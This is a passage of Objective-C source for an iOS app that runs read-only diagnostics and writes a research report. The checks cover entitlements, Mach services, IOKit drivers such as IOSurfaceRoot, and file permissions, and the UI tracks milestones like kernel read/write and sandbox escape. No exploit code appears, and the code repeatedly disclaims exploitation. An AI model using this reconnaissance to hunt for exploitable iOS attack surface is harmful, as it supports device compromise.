            @"next_research_question":@"Do publicly documented GameKit operations behave differently under the same signing configuration?",
            @"proof_level":@"metadata_only"
        }];
    }
    for (NSString *target in @[@"IOSurfaceRoot",@"AOPTouchHIDDriver",
                                @"IOMobileFramebuffer",@"AppleAVE2Driver"]) {
        NSDictionary *io=caseStats[[NSString stringWithFormat:@"2:%@",target]][@"last_result"];
        if (!io) continue;
        [questions addObject:@{
            @"topic":[NSString stringWithFormat:@"IOKit registry: %@",target],
            @"evidence":@{@"registered":io[@"service_registered"] ?: @NO,
                          @"registry_class":io[@"service_class"] ?: @"unknown",
                          @"parent_class":io[@"parent_class"] ?: @"unknown",
                          @"registry_property_count":io[@"property_count"] ?: @0,
                          @"registry_property_keys":io[@"property_key_sample"] ?: @[]},
            @"assessment":@"Registry discovery only; access to a user client or kernel memory was not tested.",
            @"next_research_question":@"Does an existing read-only inventory or public interface document this service's permitted capabilities?",
            @"proof_level":@"registry_metadata_only"
        }];
    }
    if (changed || betweenSessions.count) {
        [questions addObject:@{
            @"topic":@"Unexpected changes in observed state",
            @"evidence":@{@"within_session_changes":@(changed),
                          @"cross_session_differences":@(betweenSessions.count)},
            @"assessment":@"State changes require review against signing, OS version, thermal state and expected transient behavior.",
            @"next_research_question":@"Which exact field changed, and can it be reproduced with the same environment?",
            @"proof_level":@"unverified_change"
        }];
    }
    if (changed==0 && betweenSessions.count==0) {
        [questions addObject:@{
            @"topic":@"Low novelty in repeated samples",
            @"evidence":@{@"completed_checks":@(completed),
                          @"distinct_case_count":@(caseStats.count)},
            @"assessment":@"No stable-state changes were detected; more repetitions of the same cases are unlikely to add evidence.",
            @"next_research_question":@"Compare a different explicitly authorized signing configuration or collect a new type of read-only observation.",
            @"proof_level":@"repeatable_baseline"
        }];
    }
    return @{
        @"schema":@1,@"status":ended ? @"ended" : @"unfinished_or_active",
        @"session":latest,@"previous_session":previous ?: [NSNull null],
        @"environment":environment,
        @"elapsed_seconds":@(began>0 ? MAX(0LL,(last-began)/1000LL) : 0LL),
        @"completed_checks":@(completed),@"distinct_case_count":@(caseStats.count),
        @"first_seen_states":@(firstSeen),
        @"within_session_changes":@(changed),@"unavailable_api_calls":@(unavailable),
        @"research_questions":questions,
        @"missing_prerequisites":@[
            @"No proof of executing instructions in another process.",
            @"No proof of kernel read/write or code-signing enforcement bypass.",
            @"Successful registry discovery and bootstrap lookup are not service authorization."
        ],
        @"unmatched_before_records":@(inputs.count),
        @"per_case":cases,@"notable_observations":interesting,
        @"cross_session_differences":betweenSessions,
        @"research_signals":signals,
        @"next_research_questions":prioritizedQuestions,
        @"methodology":@{@"finding_types":@[@"first_seen",@"repeat",@"changed"],
                         @"anomaly_rule":@"A change is a difference in recorded result state, not necessarily a vulnerability",
                         @"case_matching":@"Method number plus case name",
                         @"limitations":@"The report uses the latest and immediately preceding sessions; individual operations are bounded, read-only diagnostics"},
        @"interpretation":@"These are read-only checks. Successful name lookup, registered service, access(2) or symbol visibility does not demonstrate privileged authorization, kernel compromise or jailbreak."
    };
}


/* A small plain-language companion makes a half-hour run reviewable without
 * loading hundreds of identical repeat events into a chat. */
static NSString *ForceResearchMemo(NSDictionary *report) {
    NSMutableString *memo=[NSMutableString stringWithString:
        @"FORCE RESEARCH REVIEW\nRead-only baseline diagnostics; no exploit demonstrated.\n\n"];
    [memo appendFormat:@"Session: %@\nStatus: %@\nElapsed: %@ seconds\n",
         report[@"session"] ?: @"unknown", report[@"status"] ?: @"unknown",
         report[@"elapsed_seconds"] ?: @0];
    [memo appendFormat:@"Checks: %@; distinct cases: %@; changes: %@; unavailable: %@\n",
         report[@"completed_checks"] ?: @0,report[@"distinct_case_count"] ?: @0,
         report[@"within_session_changes"] ?: @0,report[@"unavailable_api_calls"] ?: @0];
    [memo appendFormat:@"Unmatched BEFORE records: %@; cross-session differences: %lu\n\n",
         report[@"unmatched_before_records"] ?: @0,
         (unsigned long)[report[@"cross_session_differences"] count]];
    NSDictionary *environment=report[@"environment"];
    [memo appendFormat:@"Environment: %@\n\n",
         [environment isKindOfClass:NSDictionary.class] ? environment : @{}];
    NSArray *questions=report[@"research_questions"];
    if ([questions isKindOfClass:NSArray.class]) {
        [memo appendString:@"EVIDENCE AND FOLLOW-UP QUESTIONS\n"];
        for (NSDictionary *item in questions) {
            [memo appendFormat:@"\n- %@\n  Evidence: %@\n  Meaning: %@\n  Next question: %@\n",
                 item[@"topic"] ?: @"Unknown",item[@"evidence"] ?: @{},
                 item[@"assessment"] ?: @"Unclassified",
                 item[@"next_research_question"] ?: @"Unspecified"];
        }
    }
    [memo appendString:
       @"\nLIMITATIONS\nNo cross-process execution, kernel read/write, or code-signing bypass "
       @"is demonstrated by these checks. An API call returning ok only confirms "
       @"the diagnostic completed, not that the operation gained privileges.\n"];
    return memo;
}


#pragma mark - Force planning UI (Step 1 of 4)

/* Bounded read-only workers only; no malformed inputs or exploit payloads. */
@interface ForcePageController : UIViewController
@end
@implementation ForcePageController {
    UIScrollView *_scroll;
    UIStackView *_content;
    NSMutableArray<UISwitch *> *_choices;
    UISwitch *_concurrent;
    UISegmentedControl *_samplingInterval;
    UISegmentedControl *_sessionLength;
    NSTimeInterval _activeStarted;
    NSTimeInterval _pausedAt;
    NSTimeInterval _pausedTotal;
    NSTimeInterval _runLimit;
    UISwitch *_accepted;
    UILabel *_status;
    NSString *_previewSession;
    UILabel *_recoveryLabel;
    NSOperationQueue *_forceQueue;
    NSString *_activeSession;
    BOOL _stopping;
    BOOL _paused;
    NSInteger _outstanding;
    NSInteger _completedChecks;
    NSInteger _failedChecks;
    NSInteger _newStates;
    NSInteger _changedStates;
    NSTimeInterval _startedUptime;
    NSMutableArray<NSString *> *_recentEvents;
    UITextView *_liveConsole;
    UITextView *_researchPreview;
    UILabel *_liveSummary;
    UIButton *_pauseButton;
    UISwitch *_advancedToggle;
    BOOL _advancedApproved;
    NSMutableDictionary<NSString *,UISwitch *> *_milestoneSwitches;
    UISwitch *_pauseOnChange;
    BOOL _milestoneConsent;
}
- (UILabel *)addText:(NSString *)text font:(UIFont *)font {
    UILabel *label=[UILabel new];
    label.text=text;
    label.font=font;
    label.numberOfLines=0;
    [_content addArrangedSubview:label];
    return label;
}
- (void)viewDidLoad {
    [super viewDidLoad];
    self.title=@"Force";
    self.view.backgroundColor=UIColor.systemBackgroundColor;
    _choices=[NSMutableArray new];
    _recentEvents=[NSMutableArray new];
    _milestoneSwitches=[NSMutableDictionary new];
    _scroll=[UIScrollView new];
    _scroll.translatesAutoresizingMaskIntoConstraints=NO;
    [self.view addSubview:_scroll];
    _content=[UIStackView new];
    _content.axis=UILayoutConstraintAxisVertical;
    _content.spacing=16;
    _content.translatesAutoresizingMaskIntoConstraints=NO;
    [_scroll addSubview:_content];
    [NSLayoutConstraint activateConstraints:@[
        [_scroll.topAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.topAnchor],
        [_scroll.bottomAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.bottomAnchor],
        [_scroll.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor],
        [_scroll.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor],
        [_content.topAnchor constraintEqualToAnchor:_scroll.contentLayoutGuide.topAnchor constant:18],
        [_content.bottomAnchor constraintEqualToAnchor:_scroll.contentLayoutGuide.bottomAnchor constant:-24],
        [_content.leadingAnchor constraintEqualToAnchor:_scroll.frameLayoutGuide.leadingAnchor constant:18],
        [_content.trailingAnchor constraintEqualToAnchor:_scroll.frameLayoutGuide.trailingAnchor constant:-18]
    ]];
    [self addText:@"Select research methods" font:[UIFont boldSystemFontOfSize:21]];
    [self addText:@"Step 3: selected bounded checks can run concurrently or serially. Each API call is logged before and after it executes. Keep the app foregrounded." font:[UIFont preferredFontForTextStyle:UIFontTextStyleSubheadline]];
    NSArray<NSDictionary *> *methods=@[
      @{@"name":@"Signing entitlement audit",@"risk":@"Low: ordinary API errors; exposes only this app's signing permissions."},
      @{@"name":@"Mach service lookup",@"risk":@"Low: lookup failures and minor resource/battery use; no messages sent."},
      @{@"name":@"IOKit registry inventory",@"risk":@"Low: discovery-only; no user-client selectors or malformed buffers."},
      @{@"name":@"Filesystem permission matrix",@"risk":@"Low: file access checks only; no writes or restoration operations."},
      @{@"name":@"Runtime symbol availability",@"risk":@"Low: runtime symbol checks; no private APIs invoked."},
      @{@"name":@"Process stability telemetry",@"risk":@"Low: thermal, power, CPU and peak memory observations from this app only."}
    ];
    for (NSDictionary *item in methods) {
        UIStackView *line=[UIStackView new];
        line.axis=UILayoutConstraintAxisHorizontal;
        line.spacing=12;
        line.alignment=UIStackViewAlignmentCenter;
        UIStackView *titles=[UIStackView new];
        titles.axis=UILayoutConstraintAxisVertical;
        titles.spacing=4;
        UILabel *name=[UILabel new];
        name.text=item[@"name"];
        name.font=[UIFont preferredFontForTextStyle:UIFontTextStyleHeadline];
        name.numberOfLines=0;
        UILabel *risk=[UILabel new];
        risk.text=[NSString stringWithFormat:@"Possible risks: %@",item[@"risk"]];
        risk.numberOfLines=0;
        risk.font=[UIFont preferredFontForTextStyle:UIFontTextStyleFootnote];
        [titles addArrangedSubview:name];
        [titles addArrangedSubview:risk];
        [line addArrangedSubview:titles];
        UISwitch *toggle=[UISwitch new];
        [line addArrangedSubview:toggle];
        [_choices addObject:toggle];
        [_content addArrangedSubview:line];
    }
    [self addText:@"Advanced Research mode" font:[UIFont preferredFontForTextStyle:UIFontTextStyleHeadline]];
    [self addText:@"Opt-in additional bounded signing-permission checks, not automated kernel exploit attempts." font:[UIFont preferredFontForTextStyle:UIFontTextStyleFootnote]];
    UIStackView *advancedRow=[UIStackView new];
    advancedRow.axis=UILayoutConstraintAxisHorizontal;
    advancedRow.alignment=UIStackViewAlignmentCenter;
    UILabel *advancedName=[UILabel new];
    advancedName.text=@"Enable Advanced Research";
    [advancedRow addArrangedSubview:advancedName];
    _advancedToggle=[UISwitch new];
    [_advancedToggle addTarget:self action:@selector(advancedChanged:)
        forControlEvents:UIControlEventValueChanged];
    [advancedRow addArrangedSubview:_advancedToggle];
    [_content addArrangedSubview:advancedRow];
    [self addText:@"Observation cadence" font:[UIFont preferredFontForTextStyle:UIFontTextStyleHeadline]];
    _samplingInterval=[[UISegmentedControl alloc] initWithItems:@[@"5 sec",@"15 sec",@"30 sec"]];
    _samplingInterval.selectedSegmentIndex=1;
    [_content addArrangedSubview:_samplingInterval];
    [self addText:@"Session length" font:[UIFont preferredFontForTextStyle:UIFontTextStyleHeadline]];
    _sessionLength=[[UISegmentedControl alloc] initWithItems:@[@"30-minute study",@"Until stopped"]];
    _sessionLength.selectedSegmentIndex=0;
    [_content addArrangedSubview:_sessionLength];
    [self addText:@"The 30-minute timer excludes paused time. Sequential mode rotates between every selected method, rather than exhausting the timer on the first method. Runs stop when the app backgrounds." font:[UIFont preferredFontForTextStyle:UIFontTextStyleFootnote]];
    UIStackView *parallel=[UIStackView new];
    parallel.axis=UILayoutConstraintAxisHorizontal;
    parallel.alignment=UIStackViewAlignmentCenter;
    UILabel *parallelLabel=[UILabel new];
    parallelLabel.text=@"Run selected methods concurrently";
    parallelLabel.numberOfLines=0;
    [parallel addArrangedSubview:parallelLabel];
    _concurrent=[UISwitch new];
    [parallel addArrangedSubview:_concurrent];
    [_content addArrangedSubview:parallel];
    UIButton *study=[UIButton buttonWithType:UIButtonTypeSystem];
    [study setTitle:@"Prepare recommended 30-minute research study"
        forState:UIControlStateNormal];
    [study addTarget:self action:@selector(prepareResearchStudy:)
        forControlEvents:UIControlEventTouchUpInside];
    [_content addArrangedSubview:study];
    [self addText:@"Pause rules and evidence milestones"
        font:[UIFont preferredFontForTextStyle:UIFontTextStyleHeadline]];
    [self addText:@"Choose what should pause a running session. A kernel pointer leak, service lookup, entitlement, crash, or registry entry is NOT proof of a primitive. Current bounded tests do not demonstrate kernel read/write or code injection."
        font:[UIFont preferredFontForTextStyle:UIFontTextStyleFootnote]];
    NSDictionary<NSString *,NSString *> *milestones=@{
        @"kernel_read":@"Verified kernel read",
        @"kernel_write":@"Verified kernel write",
        @"sandbox_escape":@"Verified sandbox escape",
        @"code_signing_bypass":@"Verified code-signing bypass",
        @"cross_process_execution":@"Verified cross-process code execution",
        @"process_injection":@"Verified process injection"
    };
    for (NSString *key in @[@"kernel_read",@"kernel_write",@"sandbox_escape",
                             @"code_signing_bypass",@"cross_process_execution",@"process_injection"]) {
        UIStackView *row=[UIStackView new];
        row.axis=UILayoutConstraintAxisHorizontal;
        row.alignment=UIStackViewAlignmentCenter;
        UILabel *caption=[UILabel new];
        caption.text=milestones[key];
        caption.numberOfLines=0;
        [row addArrangedSubview:caption];
        UISwitch *toggle=[UISwitch new];
        _milestoneSwitches[key]=toggle;
        [row addArrangedSubview:toggle];
        [_content addArrangedSubview:row];
    }
    UIStackView *changeRow=[UIStackView new];
    changeRow.axis=UILayoutConstraintAxisHorizontal;
    changeRow.alignment=UIStackViewAlignmentCenter;
    UILabel *changeLabel=[UILabel new];
    changeLabel.text=@"Pause on changed diagnostic state (not exploit success)";
    changeLabel.numberOfLines=0;
    [changeRow addArrangedSubview:changeLabel];
    _pauseOnChange=[UISwitch new];
    [changeRow addArrangedSubview:_pauseOnChange];
    [_content addArrangedSubview:changeRow];
    [self addText:@"Risk acknowledgment" font:[UIFont preferredFontForTextStyle:UIFontTextStyleHeadline]];
    [self addText:@"Even non-destructive diagnostics can cause unexpected behavior. Future tests may require additional risk warnings. A backup reduces potential data loss but cannot guarantee against a restore-required failure. Device panic and abnormal termination cannot always be distinguished by an app." font:[UIFont preferredFontForTextStyle:UIFontTextStyleFootnote]];
    UIStackView *ack=[UIStackView new];
    ack.axis=UILayoutConstraintAxisHorizontal;
    ack.alignment=UIStackViewAlignmentCenter;
    UILabel *ackText=[UILabel new];
    ackText.text=@"I have reviewed these risks";
    ackText.numberOfLines=0;
    [ack addArrangedSubview:ackText];
    _accepted=[UISwitch new];
    [ack addArrangedSubview:_accepted];
    [_content addArrangedSubview:ack];
    UIButton *preview=[UIButton buttonWithType:UIButtonTypeSystem];
    [preview setTitle:@"Save configuration preview to journal" forState:UIControlStateNormal];
    [preview addTarget:self action:@selector(previewTapped:) forControlEvents:UIControlEventTouchUpInside];
    [_content addArrangedSubview:preview];
    UIButton *selfTest=[UIButton buttonWithType:UIButtonTypeSystem];
    [selfTest setTitle:@"Test durable before/after logging" forState:UIControlStateNormal];
    [selfTest addTarget:self action:@selector(testJournal:) forControlEvents:UIControlEventTouchUpInside];
    [_content addArrangedSubview:selfTest];
    UIButton *package=[UIButton buttonWithType:UIButtonTypeSystem];
    [package setTitle:@"Export research package (memo + report + JSONL)" forState:UIControlStateNormal];
    [package addTarget:self action:@selector(exportResearchPackage:)
        forControlEvents:UIControlEventTouchUpInside];
    [_content addArrangedSubview:package];
    UIButton *share=[UIButton buttonWithType:UIButtonTypeSystem];
    [share setTitle:@"Export Force JSONL journal" forState:UIControlStateNormal];
    [share addTarget:self action:@selector(exportJournal:) forControlEvents:UIControlEventTouchUpInside];
    [_content addArrangedSubview:share];
    UIButton *start=[UIButton buttonWithType:UIButtonTypeSystem];
    [start setTitle:@"Start selected bounded checks" forState:UIControlStateNormal];
    [start addTarget:self action:@selector(startForce:) forControlEvents:UIControlEventTouchUpInside];
    [_content addArrangedSubview:start];
    _pauseButton=[UIButton buttonWithType:UIButtonTypeSystem];
    [_pauseButton setTitle:@"Pause" forState:UIControlStateNormal];
    [_pauseButton addTarget:self action:@selector(togglePause:) forControlEvents:UIControlEventTouchUpInside];
    _pauseButton.enabled=NO;
    [_content addArrangedSubview:_pauseButton];
    UIButton *stop=[UIButton buttonWithType:UIButtonTypeSystem];
    [stop setTitle:@"Stop selected runs" forState:UIControlStateNormal];
    [stop addTarget:self action:@selector(stopForce:) forControlEvents:UIControlEventTouchUpInside];
    [_content addArrangedSubview:stop];
    _recoveryLabel=[self addText:[NSString stringWithFormat:
        @"Last session / recovery:\n%@",[ForceLog shared].recoveryReport]
        font:[UIFont preferredFontForTextStyle:UIFontTextStyleFootnote]];
    _liveSummary=[self addText:@"Idle — 0 completed checks, 0 errors"
        font:[UIFont preferredFontForTextStyle:UIFontTextStyleHeadline]];
    _liveConsole=[UITextView new];
    _liveConsole.editable=NO;
    _liveConsole.selectable=YES;
    _liveConsole.font=[UIFont monospacedSystemFontOfSize:12 weight:UIFontWeightRegular];
    _liveConsole.backgroundColor=UIColor.secondarySystemBackgroundColor;
    _liveConsole.layer.cornerRadius=8;
    [_liveConsole.heightAnchor constraintEqualToConstant:240].active=YES;
    [_content addArrangedSubview:_liveConsole];
    _liveConsole.text=@"Live event console will show real completed checks. The full history remains in force-research.jsonl.";
    [self addText:@"Research briefing" font:[UIFont preferredFontForTextStyle:UIFontTextStyleHeadline]];
    _researchPreview=[UITextView new];
    _researchPreview.editable=NO;
    _researchPreview.selectable=YES;
    _researchPreview.font=[UIFont monospacedSystemFontOfSize:12 weight:UIFontWeightRegular];
    _researchPreview.backgroundColor=UIColor.secondarySystemBackgroundColor;
    _researchPreview.layer.cornerRadius=8;
    [_researchPreview.heightAnchor constraintEqualToConstant:200].active=YES;
    [_content addArrangedSubview:_researchPreview];
    _researchPreview.text=@"Finish a run or export the research package to generate the evidence review.";
    _status=[self addText:[NSString stringWithFormat:@"Ready. Journal: %@",[ForceLog shared].path]
        font:[UIFont preferredFontForTextStyle:UIFontTextStyleFootnote]];
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(forceBackgrounded:)
        name:UIApplicationDidEnterBackgroundNotification object:nil];
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(forceForegrounded:)
        name:UIApplicationWillEnterForegroundNotification object:nil];
}
- (void)prepareResearchStudy:(id)sender {
    if (_activeSession) {
        _status.text=@"Stop the active session before changing the study preset.";
        return;
    }
    for (UISwitch *choice in _choices) choice.on=YES;
    _sessionLength.selectedSegmentIndex=0;
    _samplingInterval.selectedSegmentIndex=1;
    _concurrent.on=YES;
    _status.text=@"Research preset prepared: all six read-only methods, 15-second cadence, parallel execution, 30 active minutes. Review the risks and acknowledge before starting.";
}
- (void)previewTapped:(id)sender {
    NSMutableArray<NSString *> *selected=[NSMutableArray new];
    NSArray *names=@[@"Signing entitlement audit",@"Mach service lookup",
       @"IOKit registry inventory",@"Filesystem permission matrix",@"Runtime symbol availability",
       @"Process stability telemetry"];
    for (NSUInteger i=0;i<_choices.count;i++)
        if (_choices[i].on) [selected addObject:names[i]];
    if (!_accepted.on) {
        _status.text=@"Review and acknowledge the risks before preparing a session.";
        return;
    }
    if (!selected.count) {
        _status.text=@"Select at least one method.";
        return;
    }
    NSString *session=NSUUID.UUID.UUIDString;
    NSArray<NSNumber *> *cadences=@[@5,@15,@30];
    NSDictionary *configuration=@{
        @"methods":selected,
        @"duration":_sessionLength.selectedSegmentIndex==0 ?
            @"30 active minutes" : @"until_stopped",
        @"cadence_seconds":cadences[(NSUInteger)_samplingInterval.selectedSegmentIndex],
        @"concurrent":@(_concurrent.on),@"risk_acknowledged":@YES,
        @"advanced":@(_advancedToggle.on && _advancedApproved),
        @"execution_enabled":@NO
    };
    BOOL ok=[[ForceLog shared] record:@"configuration_preview" session:session
        method:@"interface" attempt:@"" details:configuration];
    _status.text=ok ?
        [NSString stringWithFormat:@"Saved preview to Force journal.\nSession: %@\nNo operation executed.",session] :
        [NSString stringWithFormat:@"Journal error: %@",[ForceLog shared].lastError ?: @"unknown"];
}
- (void)testJournal:(id)sender {
    NSString *session=NSUUID.UUID.UUIDString;
    NSString *attempt=NSUUID.UUID.UUIDString;
    ForceLog *journal=[ForceLog shared];
    BOOL before=[journal record:@"before" session:session method:@"journal_self_test"
        attempt:attempt details:@{@"operation":@"local_log_write_only"}];
    if (!before) {
        _status.text=[NSString stringWithFormat:@"BEFORE record could not sync: %@",journal.lastError ?: @"unknown"];
        return;
    }
    BOOL after=[journal record:@"after" session:session method:@"journal_self_test"
        attempt:attempt details:@{@"result":@"success",@"note":@"No system test was run"}];
    _status.text=after ?
        [NSString stringWithFormat:@"Durable before/after records saved.\nAttempt: %@",attempt] :
        [NSString stringWithFormat:@"AFTER record failed: %@",journal.lastError ?: @"unknown"];
}

- (void)advancedChanged:(UISwitch *)sender {
    if (!sender.on || _advancedApproved) return;
    sender.on=NO;
    UIAlertController *safety=[UIAlertController alertControllerWithTitle:
        @"Advanced Research — first-use safety review"
        message:@"This mode adds bounded signing-permission checks. Possible risks: API errors, app termination, battery drain, larger logs and loss of unsaved work if iPadOS interrupts the app. It does not intentionally panic the kernel, inject code or bypass signing. A backup does not guarantee recovery from every failure. Keep the app open and export the journal."
        preferredStyle:UIAlertControllerStyleAlert];
    [safety addAction:[UIAlertAction actionWithTitle:@"Cancel"
        style:UIAlertActionStyleCancel handler:nil]];
    [safety addAction:[UIAlertAction actionWithTitle:@"I understand — enable"
        style:UIAlertActionStyleDefault handler:^(UIAlertAction *action) {
            self->_advancedApproved=YES;
            self->_advancedToggle.on=YES;
            [[ForceLog shared] record:@"advanced_consent" session:@"interface"
                method:@"safety_review" attempt:@""
                details:@{@"accepted":@YES,@"scope":@"bounded_signing_verification"}];
        }]];
    [self presentViewController:safety animated:YES completion:nil];
}
- (void)startForce:(id)sender {
    if (_activeSession) { _status.text=@"A session is already running."; return; }
    if (!_accepted.on) { _status.text=@"Review and acknowledge the risks first."; return; }
    NSMutableArray<NSNumber *> *chosen=[NSMutableArray new];
    for (NSUInteger index=0;index<_choices.count;index++)
        if (_choices[index].on) [chosen addObject:@(index)];
    if (!chosen.count) { _status.text=@"Select at least one method."; return; }
    ForceLog *log=[ForceLog shared];
    if (log.lastError) { _status.text=log.lastError; return; }
    BOOL advanced=_advancedToggle.on && _advancedApproved;
    NSMutableArray<NSString *> *pauseMilestones=[NSMutableArray new];
    for (NSString *key in _milestoneSwitches)
        if (_milestoneSwitches[key].on) [pauseMilestones addObject:key];
    BOOL pauseOnChange=_pauseOnChange.on;
    if (pauseMilestones.count && !_milestoneConsent) {
        UIAlertController *safety=[UIAlertController alertControllerWithTitle:
            @"Verified primitive auto-pause — safety review"
            message:@"These switches only react to independently verified evidence, not a kernel address leak, crash, service lookup or entitlement. Current Force diagnostics do not establish the requested exploitation primitives. Unexpected device termination is not automatically a kernel panic. Back up your data and review journal exports before interpreting any result."
            preferredStyle:UIAlertControllerStyleAlert];
        [safety addAction:[UIAlertAction actionWithTitle:@"Cancel" style:UIAlertActionStyleCancel handler:nil]];
        [safety addAction:[UIAlertAction actionWithTitle:@"I understand" style:UIAlertActionStyleDefault handler:^(UIAlertAction *action) {
            self->_milestoneConsent=YES;
            [[ForceLog shared] record:@"milestone_safety_consent"
                session:@"interface" method:@"runner" attempt:@""
                details:@{@"accepted":@YES}];
            [self startForce:nil];
        }]];
        [self presentViewController:safety animated:YES completion:nil];
        return;
    }
    NSArray<NSNumber *> *cadences=@[@5,@15,@30];
    NSInteger cadence=[cadences[(NSUInteger)_samplingInterval.selectedSegmentIndex] integerValue];
    NSTimeInterval limit=_sessionLength.selectedSegmentIndex==0 ? 1800.0 : 0.0;
    NSString *session=NSUUID.UUID.UUIDString;
    if (![log record:@"session_start" session:session method:@"runner" attempt:@""
             details:@{@"method_indices":chosen,
                       @"duration_seconds":limit>0 ? (id)@(limit) : (id)@"until_stopped",
                       @"concurrent":@(_concurrent.on),@"advanced":@(advanced),
                       @"cadence_seconds":@(cadence),@"environment":ForceEnvironmentSnapshot(),
                       @"pause_on_verified":pauseMilestones,@"pause_on_state_change":@(pauseOnChange)}]) {
        _status.text=log.lastError ?: @"Could not save session record";
        return;
    }
    _activeSession=session;
    _stopping=NO;
    _paused=NO;
    _completedChecks=0;
    _failedChecks=0;
    _newStates=0;
    _changedStates=0;
    _startedUptime=NSProcessInfo.processInfo.systemUptime;
    _activeStarted=_startedUptime;
    _pausedTotal=0;
    _pausedAt=0;
    _runLimit=limit;
    [_recentEvents removeAllObjects];
    _pauseButton.enabled=YES;
    [_pauseButton setTitle:@"Pause" forState:UIControlStateNormal];
    _outstanding=chosen.count;
    _forceQueue=[NSOperationQueue new];
    // Every worker must be scheduled: serializing an infinite worker queue
    // used to starve all selected methods after the first.
    _forceQueue.maxConcurrentOperationCount=(NSInteger)chosen.count;
    BOOL simultaneous=_concurrent.on;
    NSLock *serialGate=[NSLock new];
    __weak ForcePageController *weakSelf=self;
    for (NSNumber *number in chosen) {
        NSUInteger method=number.unsignedIntegerValue;
        [_forceQueue addOperationWithBlock:^{
            NSMutableArray<NSString *> *expanded=[ForceItems(method) mutableCopy];
            if (advanced && method==0)
                [expanded addObjectsFromArray:@[@"platform-application",
                    @"com.apple.private.security.no-sandbox",
                    @"com.apple.security.application-groups"]];
            NSArray<NSString *> *items=expanded;
            NSInteger iteration=0;
            NSMutableDictionary<NSString *,NSDictionary *> *lastStates=[NSMutableDictionary new];
            while (YES) {
                ForcePageController *strongSelf=weakSelf;
                if (!strongSelf) break;
                BOOL shouldStop=NO, isPaused=NO;
                @synchronized(strongSelf) {
                    shouldStop=strongSelf->_stopping;
                    isPaused=strongSelf->_paused;
                }
                if (shouldStop) break;
                NSTimeInterval active=0;
                @synchronized(strongSelf) {
                    NSTimeInterval now=NSProcessInfo.processInfo.systemUptime;
                    active=(strongSelf->_paused ? strongSelf->_pausedAt : now)
                           - strongSelf->_activeStarted - strongSelf->_pausedTotal;
                }
                if (limit>0 && active>=limit) break;
                if (isPaused) {
                    [NSThread sleepForTimeInterval:0.2];
                    continue;
                }
                NSString *item=items[(NSUInteger)iteration%items.count];
                if (!simultaneous) [serialGate lock];
                // Stop/pause may have been requested while waiting for the gate.
                BOOL abort=NO;
                @synchronized(strongSelf) {
                    abort=strongSelf->_stopping || strongSelf->_paused;
                }
                if (abort) {
                    if (!simultaneous) [serialGate unlock];
                    if (strongSelf->_stopping) break;
                    continue;
                }
                NSString *attempt=NSUUID.UUID.UUIDString;
                BOOL saved=[log record:@"before" session:session
                    method:[NSString stringWithFormat:@"%lu",(unsigned long)method]
                    attempt:attempt details:@{@"case":item,@"iteration":@(iteration)}];
                if (!saved) {
                    if (!simultaneous) [serialGate unlock];
                    break; // Never issue a request without a durable before record.
                }
                NSTimeInterval began=NSProcessInfo.processInfo.systemUptime;
                NSDictionary *result=ForceBoundedCheck(method,item);
                NSNumber *latencyMs=@((NSInteger)((NSProcessInfo.processInfo.systemUptime-began)*1000.0));
                NSDictionary *stable=ForceStableState(method,result);
                NSDictionary *previous=lastStates[item];
                NSString *finding=previous ?
                    ([previous isEqualToDictionary:stable] ? @"repeat" : @"changed") : @"first_seen";
                NSMutableDictionary *after=[@{
                    @"result":result ?: @{},@"iteration":@(iteration),
                    @"case":item,@"latency_ms":latencyMs,@"finding":finding,
                    @"stable_state":stable
                } mutableCopy];
                if ([finding isEqualToString:@"changed"]) after[@"previous_state"]=previous;
                BOOL afterSaved=[log record:@"after" session:session
                    method:[NSString stringWithFormat:@"%lu",(unsigned long)method]
                    attempt:attempt details:after];
                if (!simultaneous) [serialGate unlock];
                if (!afterSaved) break;
                // The bounded diagnostics do not produce a verified exploit
                // primitive. Do not infer one from a successful API response.
                if (pauseOnChange && [finding isEqualToString:@"changed"]) {
                    @synchronized(strongSelf) {
                        if (!strongSelf->_paused && !strongSelf->_stopping) {
                            strongSelf->_paused=YES;
                            strongSelf->_pausedAt=NSProcessInfo.processInfo.systemUptime;
                        }
                    }
                    [log record:@"auto_pause" session:session
                        method:[NSString stringWithFormat:@"%lu",(unsigned long)method]
                        attempt:attempt details:@{
                            @"reason":@"changed_diagnostic_state",
                            @"primitive_verified":@NO,@"case":item,
                            @"previous_state":previous ?: @{},@"new_state":stable
                        }];
                    [[NSOperationQueue mainQueue] addOperationWithBlock:^{
                        ForcePageController *screen=weakSelf;
                        if (screen && [screen->_activeSession isEqualToString:session]) {
                            [screen->_pauseButton setTitle:@"Resume" forState:UIControlStateNormal];
                            screen->_status.text=@"Paused on changed diagnostic state. This is NOT a verified exploit.";
                        }
                    }];
                }
                lastStates[item]=stable;
                iteration++;
                [[NSOperationQueue mainQueue] addOperationWithBlock:^{
                    ForcePageController *screen=weakSelf;
                    if (!screen || ![screen->_activeSession isEqualToString:session]) return;
                    screen->_completedChecks++;
                    if (![result[@"status"] isEqualToString:@"ok"]) screen->_failedChecks++;
                    if ([finding isEqualToString:@"first_seen"]) screen->_newStates++;
                    if ([finding isEqualToString:@"changed"]) screen->_changedStates++;
                    NSString *line=[NSString stringWithFormat:@"[%@] M%lu %@ %@ %@ (%@ms)",
                        [[NSISO8601DateFormatter new] stringFromDate:[NSDate date]],
                        (unsigned long)method,
                        [finding isEqualToString:@"changed"] ? @"CHANGED" :
                        ([finding isEqualToString:@"first_seen"] ? @"NEW" : @"repeat"),
                        item,result[@"status"] ?: @"unknown",latencyMs];
                    [screen->_recentEvents addObject:line];
                    if (screen->_recentEvents.count>80)
                        [screen->_recentEvents removeObjectAtIndex:0];
                    screen->_liveConsole.text=[screen->_recentEvents componentsJoinedByString:@"\n"];
                    screen->_liveSummary.text=[NSString stringWithFormat:
                        @"%@ • %ld workers • %ld checks • %ld new • %ld changes • %ld API errors • %.0f sec",
                        screen->_paused ? @"Paused" : @"Running",
                        (long)screen->_outstanding,(long)screen->_completedChecks,
                        (long)screen->_newStates,(long)screen->_changedStates,
                        (long)screen->_failedChecks,
                        (screen->_paused ? screen->_pausedAt :
                            NSProcessInfo.processInfo.systemUptime)
                            -screen->_activeStarted-screen->_pausedTotal];
                }];
                // A paused session must not consume its 30-minute active budget.
                for (NSInteger delay=0;delay<cadence;) {
                    BOOL stop=NO, paused=NO;
                    @synchronized(strongSelf) {
                        stop=strongSelf->_stopping; paused=strongSelf->_paused;
                    }
                    if (stop) break;
